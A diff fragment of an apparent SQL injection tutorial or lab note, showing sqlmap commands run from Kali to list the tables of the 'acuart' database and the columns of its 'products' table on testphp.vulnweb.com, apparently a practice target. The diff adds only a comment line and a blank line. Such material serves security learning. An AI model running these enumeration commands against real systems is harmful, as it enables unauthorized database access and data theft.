@@ -83,6 +83,7 @@ available databases [2]:
 ---------------------------------------------------------------------------------------------------------------------------------------
  ➤➤ To Check tables of Acuart Database i am using this command
            sqlmap –u testphp.vulnweb.com/artists.php?artist=1 –D acuart –tables
+ ➤➤ This gives list of tables in databse 
 
 ┌──(kali㉿kali)-[~]
 └─$ sqlmap –u testphp.vulnweb.com/artists.php?artist=1 –D acuart –tables
@@ -132,6 +133,7 @@ Database: acuart
 
 [*] ending @ 12:45:25 /2023-01-21/
 ---------------------------------------------------------------------------------------------------------------------------------
+
                                                                                                                                                                                
 ┌──(kali㉿kali)-[~]
 └─$ sqlmap –u testphp.vulnweb.com/artists.php?artist=1 –D acuart –T products –columns
